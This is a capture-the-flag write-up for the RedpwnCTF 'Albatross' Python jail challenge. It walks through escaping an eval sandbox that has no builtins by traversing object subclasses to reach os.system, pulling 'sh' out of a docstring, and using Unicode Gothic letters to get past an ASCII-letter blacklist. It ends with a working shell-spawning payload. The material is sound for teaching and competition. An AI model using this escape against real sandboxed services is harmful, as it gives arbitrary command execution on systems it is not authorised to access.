# RedpwnCTF - Albatross

This was an awesome PyJail challenge from RedpwnCTF - we're provided with this source code,

```python
#!/usr/bin/env python3.7

from rctf import golf
import string, os


# NOTE: Although this challenge may seem impossible, rest assured that we have 
# a working solution that would meet the length restriction within the first  
# few days of the CTF. Keep digging!


rate = 2 # bytes per hour
base = 30 # amount to start with
blacklist = string.ascii_letters + '"\' '


if __name__ == '__main__':
    # create banner
    n = golf.calculate_limit(
        'https://staging.redpwn.net/' if os.environ.get('DEBUG') else 'https://2020.redpwn.net/',
        'albatross', # challenge id
        1592769600, # CTF start date
        lambda hours : int(base + (hours * rate))
    )
    
    print(
        'Welcome to Albatross, the pyjail challenge you wish never existed.\n'
        f'* At the moment, you are only permitted to use a payload of {n} bytes or shorter.\n'
        f'* Every hour, the byte restriction will increase by {rate}.\n'
        '* Once the a team solves this challenge, the restriction will stop increasing\n'
        '* The flag is in /flag.txt\n'
        '* Don\'t let b1c get those HackerOne hoodies! Now\'s your chance to stop them with this high-point challenge.\n' # i literally made this challenge to disadvantage b1c btw
    )

    # filter payload
    try:
        payload = ''.join([
            (x if x not in blacklist else '')
            for x in
            input('>>> ')[:n]
        ])
    except (EOFError, KeyboardInterrupt):
        print('\nYou gave up. Understandable.')
        exit()

    # execute payload
    eval(str(payload), {'__builtins__' : None}, {})

```

This combines a traditional PyJail escape (with draconian conditions) with code golfing - one of my favourite pastimes.&#x20;

Let's break down what we've been given - the comment tells us that the flag is in flag.txt, so our ultimate goal is to construct a payload to allow us to read /flag.txt - this could directly open and read the file, or more indirectly we could obtain a shell, and use that shell to read the file.

First, our payload is filtered -

```python
    try:
        payload = ''.join([
            (x if x not in blacklist else '')
            for x in
            input('>>> ')[:n]
        ])
    except (EOFError, KeyboardInterrupt):
        print('\nYou gave up. Understandable.')
        exit()
```

This prevents us from passing any payload containing any of the characters in the blacklist by replacing each instance of a banned character with nothing - as&#x20;

```python
blacklist = string.ascii_letters + '"\' ' 
```

we are not allowed to pass payloads containing any letters, quotes or spaces! Already, this would be very difficult - but there's more! the `[:n]`slices our payload, taking only the first n characters - functioning as a length limit. This length is defined at the top -

```python
rate = 2 # bytes per hour
base = 30 # amount to start with
blacklist = string.ascii_letters + '"\' '


if __name__ == '__main__':
    # create banner
    n = golf.calculate_limit(
        'https://staging.redpwn.net/' if os.environ.get('DEBUG') else 'https://2020.redpwn.net/',
        'albatross', # challenge id
        1592769600, # CTF start date
        lambda hours : int(base + (hours * rate))
    )
```

This is the code golfing aspect of the challenge - with a starting character limit of 30,  every hour the amount of characters allowed increases by 2 - an ingenious method to promote code golfing, as the limit stops increasing once a solve has been found - so solving it earlier makes it harder for anyone else to solve!

```python
eval(str(payload), {'__builtins__' : None}, {})
```

Finally, our payload is executed via eval - but with a twist. The eval function actually takes two optional arguments as well as a string to evaluate -`eval(source, globals=None, locals=None, /)`. This is because Python actually keeps track of local and global variables by storing them in their own dictionaries - you can see this by running `globals()` or `locals()` in a Python interpreter session -&#x20;

```python
>>> print(locals())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>}
>>> print(globals())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (buirlt-in)>}.
```

Most important of all the items in this dictionary is `__builtins__` - this points to a module containing all of the built-in functions that Python provides for you when you first start writing a program. This includes standard functions like `print()`, `chr()` and `open()`, but also apparent syntax constructs like import - since `import x` is transformed into `__import__("x")`in parsing.&#x20;

So, to circle all the way back around, eval allows you to set what the values of these two dictionaries will be when the given code is executed - in our example, they have been hardcoded to be empty with the `__builtins__` option specifically set to None. This means that we do not have access to any of Python's built-in functions!

In summary, with the restrictions levied above we must somehow provide Python code to read the file /flag.txt, but this code must not use any built-in functions, contain any letters, quotes or spaces, and must be within a very specific length limit.

This may seem impossible at first (as the creators of the challenge warned us in the code comment!) so let's try dealing with one restriction at a time - the easiest one to tackle first is the lack of built-in functions.

Having your code executed without `__builtins__` is the traditional PyJail setup, and thus there are multitudinous resources available detailing how to bypass this restriction. To give a summary, in Python everything is an object, and there are special attributes common to practically every object - for example, `__doc__` stores a docstring describing the object and `__dict__` stores a dictionary of all the attributes of that object. The plan is to use Python's inheritance mechanisms to obtain access to a copy of `__builtins__` stored somewhere within an object - we may not have access to functions, but we can obtain a class (in this case, the Tuple class, but any class could theoretically work) like so -

```python
>>> ().__class__
<class 'tuple'>
```

From here, we can gain access to the `object` class like so

```python
>>> ().__class__.__base__
<class 'object'>
```

As practically everything in Python is an object, this class is the base for practically every single object - so we can now use this class to obtain a huge list of objects currently loaded by Python by listing all of the subclasses that inherit from this class

```python
>>> ().__class__.__base__.__subclasses__()
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, ... ]
```

We can now use these objects to break out from our rather restricted environment - the most commonly chosen object from this list is the catch\_warnings object from the warnings module, found at position 139 in my example object list - this is because this object uses the `sys` module as part of its `__init__` function, and thus has the `sys` module present in its global variables. As can be seen from [https://github.com/python/cpython/blob/main/Lib/warnings.py](https://github.com/python/cpython/blob/main/Lib/warnings.py),&#x20;

```python
class catch_warnings(object):

    ...

    def __init__(self, *, record=False, module=None):
        """Specify whether to record warnings and if an alternative module
        should be used other than sys.modules['warnings'].
        For compatibility with Python 3.0, please consider all arguments to be
        keyword-only.
        """
        self._record = record
        self._module = sys.modules['warnings'] if module is None else module
        self._entered = False

```

In turn, the `sys` module imports the `os` module, and keeps a list of which modules it has imported in `modules` - the `os` module contains the `system` function - capable of executing a string passed to it and dumping the result to stdout - this is my ultimate goal. Putting all of that together, in my example I can obtain access to the system function like this, and thus give myself a shell

```python
>>> ().__class__.__base__.__subclasses__()[139].__init__.__globals__["sys"]
<module 'sys' (built-in)>
>>> ().__class__.__base__.__subclasses__()[139].__init__.__globals__["sys"].modules["os"]
<module 'os' from '/usr/lib/python3.8/os.py'>
>>> ().__class__.__base__.__subclasses__()[139].__init__.__globals__["sys"].modules["os"].system("sh")
$ 
```

This solves our first problem, but this payload needs to contain no quotes, letters and spaces, as well as be short enough to qualify to solve this challenge. First, we can improve the length of this slightly - we could get access to `__builtins__` directly from the `sys` module, as it has its own copy, but we can note that the top of the file it does `import string, os` meaning that their code actually has `os` already imported as a global, and some objects from `os` are present in the overall object list. Some enumeration revealed some promising candidates - I chose `os._wrap_close` - it was present in the overall object space, and as part of the os module it also had every single other function from `os` present in its globals - this meant I could shorten my payload considerably like so

```python
>>> ().__class__.__base__.__subclasses__()[132]
<class 'os._wrap_close'>
>>> ().__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]
<built-in function system>
>>> ().__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]("sh")
$ 
```

Next, I decided to remove the quotes. Earlier, I mentioned that most objects have a docstring present in `__doc__`- these are a reliable source of characters, and can be accessed without quotes. After analysing some docstrings, I found a relatively short way to obtain the "sh" string using a long step with a slice in the list docstring -

```python
>>> [].__doc__
'Built-in mutable sequence.\n\nIf no argument is given, the constructor creates a new empty list.\nThe argument must be an iterable if specified.'
>>> [].__doc__[17::79]
'sh'
```

But rather than try and construct "system", I resolved to instead turn it into an offset - since `__globals__` is a dictionary, I couldn't access it using a position like an array. But, if I could transform that dictionary into an array I could use the position in the list to access my chosen object without any quotes necessary! I used the `dict.values()` function - this takes a dictionary and returns an array of the values of each item in that dictionary. It was almost perfect - except&#x20;

```python
>>> x = {"a": 1, "b": 2}
>>> x.values()
dict_values([1, 2])
>>> x.values()[1]
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: 'dict_values' object is not subscriptable
```

It doesn't return a plain array, but rather a specific object - luckily, the `dict_values` object can be de-encapsulated using the python spread operator, \*. The spread operator takes an iterable, and passes each of the items in the iterable to the outer function call as separate arguments - combining this with a list constructor \[], I could quickly convert my `dict_values` object into a list, ready for me to index it.

```python
>>> x = {"a": 1, "b": 2}
>>> x.values()
dict_values([1, 2])
>>> [*x.values()]
[1, 2]
```

I can now write my payload as

```python
>>> [*().__class__.__base__.__subclasses__()[132].__init__.__globals__.values()][45]
<built-in function system>
>>> [*().__class__.__base__.__subclasses__()[132].__init__.__globals__.values()][45]([].__doc__[17::79])
$ 
```

This was just barely short enough to pass the length limit at the time when I did the challenge, clocking in at 100 chars out of my 109 allocated. Now only one problem remains - the letters. While I haven't used any strings, I've used letters to access the properties of various objects, and it doesn't seem like there's any way around this - in fact, I'm pretty sure there isn't a way to complete this without accessing object properties like this! So, how do I use letters in my payload, but still use none of the blacklisted characters? Note that the blacklisted characters are specifically the ASCII letters, from the normal character set - the ones I'm writing this writeup in now. Python, however, is very willing to deal with exotic and unusual Unicode dialects - in fact, it will normalise Unicode given to it in some scenarios - including in the interactive console, and in evals! For example, I can call print without using any ASCII letters by replacing them with characters from the Unicode Gothic character set (or indeed any character set which normalises to plain letters), like so

```python
>>> 𝔭𝔯𝔦𝔫𝔱("hello!")
hello!
>>> 
```

This is the final step necessary for my payload - putting all of this together I end up with

```python
[*().__𝔠𝔩𝔞𝔰𝔰__.__𝔟𝔞𝔰𝔢__.__𝔰𝔲𝔟𝔠𝔩𝔞𝔰𝔰𝔢𝔰__()[127].__𝔦𝔫𝔦𝔱__.__𝔤𝔩𝔬𝔟𝔞𝔩𝔰__.𝔳𝔞𝔩𝔲𝔢𝔰()][42]([].__𝔡𝔬𝔠__[17::79])
```

Sending this to the server results in a shell, with which I can read the flag! `flag{SH*T_I_h0pe_ur_n0t_b1c...if_y0u@r3,_th1$_isn't_th3_fl@g}`

I really enjoyed this challenge - it was a fresh take on a classic PyJail challenge, and provided the perfect opportunity to do a deep dive into some Python internals, as well as have a little code golfing fun.
